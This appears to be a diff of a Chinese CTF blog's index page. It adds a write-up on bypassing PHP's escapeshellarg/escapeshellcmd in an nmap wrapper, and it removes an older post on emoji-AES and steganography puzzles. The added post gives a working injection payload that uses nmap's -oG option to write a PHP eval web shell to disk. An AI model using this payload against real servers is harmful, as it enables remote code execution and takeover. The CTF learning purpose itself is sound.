@@ -113,7 +113,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/SSRF/" style="font-size: 11.67px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 13.33px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.67px;">http</a> <a href="/tags/java/" style="font-size: 13.33px;">java</a> <a href="/tags/misc/" style="font-size: 11.67px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 13.33px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.33px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 13.33px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 16.67px;">脚本编写</a>
+						<a href="/tags/SSRF/" style="font-size: 11.43px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 12.86px;">SSTI</a> <a href="/tags/http/" style="font-size: 11.43px;">http</a> <a href="/tags/java/" style="font-size: 12.86px;">java</a> <a href="/tags/misc/" style="font-size: 11.43px;">misc</a> <a href="/tags/php%E7%89%B9%E6%80%A7/" style="font-size: 12.86px;">php特性</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 18.57px;">sql注入</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 20px;">代码审计</a> <a href="/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" style="font-size: 15.71px;">命令执行</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E5%8F%8A%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">文件泄露及代码审计</a> <a href="/tags/%E6%A8%A1%E6%9D%BF/" style="font-size: 14.29px;">模板</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%88%86%E7%A0%B4/" style="font-size: 10px;">爆破</a> <a href="/tags/%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/" style="font-size: 17.14px;">脚本编写</a>
 					</div>
 				</section>
 				
@@ -168,6 +168,76 @@
 	</div>
 </nav>
       <div class="body-wrap">
+  
+    <article id="post-escapeshellarg和escapeshellcmd函数重过滤绕过" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/08/29/escapeshellarg%E5%92%8Cescapeshellcmd%E5%87%BD%E6%95%B0%E9%87%8D%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/" class="article-date">
+  	<time datetime="2021-08-28T16:00:00.000Z" itemprop="datePublished">2021-08-29</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/08/29/escapeshellarg%E5%92%8Cescapeshellcmd%E5%87%BD%E6%95%B0%E9%87%8D%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87/">
+        escapeshellarg和escapeshellcmd函数重过滤绕过
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="nmap命令与escapeshellarg和escapeshellcmd函数"><a href="#nmap命令与escapeshellarg和escapeshellcmd函数" class="headerlink" title="nmap命令与escapeshellarg和escapeshellcmd函数"></a>nmap命令与escapeshellarg和escapeshellcmd函数</h1><p>打开页面，可以看见源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;</span><br><span class="line">    $_SERVER[&#x27;REMOTE_ADDR&#x27;] = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#x27;host&#x27;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $host = $_GET[&#x27;host&#x27;];</span><br><span class="line">    $host = escapeshellarg($host);</span><br><span class="line">    $host = escapeshellcmd($host);</span><br><span class="line">    $sandbox = md5(&quot;glzjin&quot;. $_SERVER[&#x27;REMOTE_ADDR&#x27;]);</span><br><span class="line">    echo &#x27;you are in sandbox &#x27;.$sandbox;</span><br><span class="line">    @mkdir($sandbox);</span><br><span class="line">    chdir($sandbox);</span><br><span class="line">    echo system(&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;.$host);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中的X-Foewarded-For和Remote-Addr是服务器用来获取ip的，而escapeshellarg()和escapeshellcmd()函数是对特殊字符进行转义的</p>
+<p>escapeshellarg()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">escapeshellarg()函数会对单引号用反斜杠进行转义，并再用单引号将左右两部分括起来，起到连接的作用</span><br></pre></td></tr></table></figure>
+<p>escapeshellcmd()</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">对特殊字符加反斜杠进行转义，特殊字符为：&amp;#;`|*?~&lt;&gt;^()[]&#123;&#125;$\, \x0A 和 \xFF，以及&#x27;和&quot;在不配对的情况下，以及%和！</span><br><span class="line"></span><br><span class="line">在windows情况下，会将这些特殊字符转化为空格，而在linux下，如果是在system()函数中，\的转义会失效</span><br></pre></td></tr></table></figure>
+
+<p>而使用|&amp;或&amp;&amp;通道的方式，会受到escapeshellarg()和escapeshellcmd()函数转义的影响，而nmap命令可以使用-oG来创建php文件并写入内容</p>
+<p>因此，我们可以构造</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; &lt;?php @eval($_POST[&#x27;host&#x27;]); ?&gt; -oG test.php &#x27;</span><br></pre></td></tr></table></figure>
+<p>来上传木马，而后会显示出文件的位置，最后用蚁剑连接就行</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
   
     <article id="post-union绕过(反序列化)" class="article article-type-post" itemscope itemprop="blogPost">
   
@@ -786,83 +856,6 @@
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-表情包加密" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/08/01/%E8%A1%A8%E6%83%85%E5%8C%85%E5%8A%A0%E5%AF%86/" class="article-date">
-  	<time datetime="2021-07-31T16:00:00.000Z" itemprop="datePublished">2021-08-01</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/08/01/%E8%A1%A8%E6%83%85%E5%8C%85%E5%8A%A0%E5%AF%86/">
-        表情包解密及MP3文件分析
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="MP3文件的分离及表情包和winding的解密"><a href="#MP3文件的分离及表情包和winding的解密" class="headerlink" title="MP3文件的分离及表情包和winding的解密"></a>MP3文件的分离及表情包和winding的解密</h1><h2 id="蓝帽杯（冬奥）"><a href="#蓝帽杯（冬奥）" class="headerlink" title="蓝帽杯（冬奥）"></a>蓝帽杯（冬奥）</h2><p>下载文件，发现是一张图片，此时用kali的binwalk进行分离，</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk 文件名称</span><br></pre></td></tr></table></figure>
-<p>发现有rar文件、MP3文件及zip文件，之后发现zip文件无用，然后用kali的MP3Stego对mp3文件进行解密，密码猜测为冬奥会举办时间</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">解密：</span><br><span class="line">decode.exe -P 密码 文件及路径</span><br><span class="line"></span><br><span class="line">加密：</span><br><span class="line">encode.exe -P 密码 文件及路径</span><br></pre></td></tr></table></figure>
-<p>然后发现有一串\x的数字，按特征，是utf-8编码，因此可以使用脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">#coding=utf-8</span><br><span class="line">print(b&quot;\xe2\x9c\x8c\xef\xb8\x8e \xe2\x98\x9d\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x98\x9f\xef\xb8\x8e\xe2\x97\x86\xef\xb8\x8e\xe2\x99\x8c\xef\xb8\x8e \xe2\x9d\x92\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x97\xbb\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x96\xa0\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xe2\x9d\x8d\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x99\x8e\xef\xb8\x8e \xf0\x9f\x93\x82\xef\xb8\x8e\xe2\x99\x8d\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xf0\x9f\x8f\xb1\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xf0\x9f\x99\xb5 \xe2\x99\x93\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e \xe2\x9d\x96\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x99\x93\xef\xb8\x8e\xe2\x96\xa0\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\x9d\x92\xef\xb8\x8e\xe2\x99\x8f\xef\xb8\x8e\xe2\xac\xa7\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x93\xef\xb8\x8e\xe2\x96\xa0\xef\xb8\x8e\xe2\x99\x91\xef\xb8\x8e\xf0\x9f\x93\xac\xef\xb8\x8e \xf0\x9f\x95\x88\xef\xb8\x8e\xe2\x99\x92\xef\xb8\x8e\xe2\x8d\x93\xef\xb8\x8e \xe2\x96\xa0\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e \xe2\xa7\xab\xef\xb8\x8e\xe2\x99\x8b\xef\xb8\x8e\xf0\x9f\x99\xb5\xe2\x99\x8f\xef\xb8\x8e \xe2\x99\x8b\xef\xb8\x8e \xe2\x97\x8f\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xe2\x96\xa1\xef\xb8\x8e\xf0\x9f\x99\xb5 \xe2\x99\x8b\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e \xe2\x99\x93\xef\xb8\x8e\xe2\xa7\xab\xef\xb8\x8e\xe2\x9c\x8d\xef\xb8\x8e&quot;.decode(&#x27;utf-8&#x27;))</span><br></pre></td></tr></table></figure>
-<p>可以得到一串符号(注意要在pycharm中运行，命令行会有乱码）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">✌︎ ☝︎♓︎⧫︎☟︎◆︎♌︎ ❒︎♏︎◻︎□︎⬧︎♓︎⧫︎□︎❒︎⍓︎ ■︎♋︎❍︎♏︎♎︎ 📂︎♍︎♏︎🏱︎♏︎♋︎🙵 ♓︎⬧︎ ❖︎♏︎❒︎⍓︎ ♓︎■︎⧫︎♏︎❒︎♏︎⬧︎⧫︎♓︎■︎♑︎📬︎ 🕈︎♒︎⍓︎ ■︎□︎⧫︎ ⧫︎♋︎🙵♏︎ ♋︎ ●︎□︎□︎🙵 ♋︎⧫︎ ♓︎⧫︎✍︎</span><br></pre></td></tr></table></figure>
-<p>看特征是winding编码，因此可以使用<a target="_blank" rel="noopener" href="https://lingojam.com/WingdingsTranslator%E8%BF%9B%E8%A1%8C%E5%9C%A8%E7%BA%BF%E8%A7%A3%E7%A0%81%EF%BC%8C%E5%BE%97%E5%88%B0">https://lingojam.com/WingdingsTranslator进行在线解码，得到</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">A︎ G︎i︎t︎H︎u︎b︎ r︎e︎p︎o︎s︎i︎t︎o︎r︎y︎ n︎a︎m︎e︎d︎ 1︎c︎e︎P︎e︎a︎k i︎s︎ v︎e︎r︎y︎ i︎n︎t︎e︎r︎e︎s︎t︎i︎n︎g︎.︎ W︎h︎y︎ n︎o︎t︎ t︎a︎ke︎ a︎ l︎o︎o︎k </span><br></pre></td></tr></table></figure>
-<p>可以知道只要在github搜索1cePeak即可得到</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">echo How_6ad_c0uld_a_1cePeak_be? &gt;&amp;2</span><br></pre></td></tr></table></figure>
-<p>之后将rar放进winhex中，发现chiper，因此可以进行hex解码，得到</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">🙃💵🌿🎤🚪🌏🐎🥋🚫😆🎃✅⌨🔪❓🚫🐍🙃🔬✉👁😆🎈🐘🏎🐘🐘😂😎🎅🖐🐍✉🍌🌪🐎🍵✅🚪✖☃👣👉ℹ🔪🍎🔄👣🚪😁👣💵🐅🍵🔬🛩😇🖐🖐🎅✅🏎👌🚨😆🎤🎅🦓🌿🦓🙃✖🍌🛩😂👑🌏☃😇😍🛩🚹😀🍌🎈💧🗒🗒</span><br></pre></td></tr></table></figure>
-<p>这是表情包+aes加密，因此可以使用<a target="_blank" rel="noopener" href="https://aghorler.github.io/emoji-aes/%E8%BF%9B%E8%A1%8C%E8%A7%A3%E5%AF%86%EF%BC%8C%E5%AF%86%E7%A0%81%E4%B8%BA%E5%89%8D%E9%9D%A2mp3%E6%96%87%E4%BB%B6%E4%B8%AD%E6%89%BE%E5%88%B0%E7%9A%84How_6ad_c0uld_a_1cePeak_be">https://aghorler.github.io/emoji-aes/进行解密，密码为前面mp3文件中找到的How_6ad_c0uld_a_1cePeak_be</a>?</p>
-<h2 id="巅峰极客（签到）"><a href="#巅峰极客（签到）" class="headerlink" title="巅峰极客（签到）"></a>巅峰极客（签到）</h2><p>打开文件，发现表情包</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">🙃💵🌿🎤🚪🌏🐎🥋🚫😆😍🥋🐘🍴🚰😍☀🌿😇😍😡🏎👉🛩🤣🖐💧☺🌉🏎😇😆🎈💧⏩☺🔄🌪⌨🐅🎅🙃🍌🙃🔪☂🏹🕹☃🌿🌉💵🐎🐍😇🍵😍🐅🎈🥋🚰✅🎈🎈</span><br></pre></td></tr></table></figure>
-<p>且题目说给GAME，因此使用<a target="_blank" rel="noopener" href="https://aghorler.github.io/emoji-aes/%E8%A7%A3%E5%AF%86%EF%BC%8C%E5%AF%86%E7%A0%81%E4%B8%BAGAME">https://aghorler.github.io/emoji-aes/解密，密码为GAME</a>
- </p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/misc/" rel="tag">misc</a></li></ul>
 	</div>
 
       
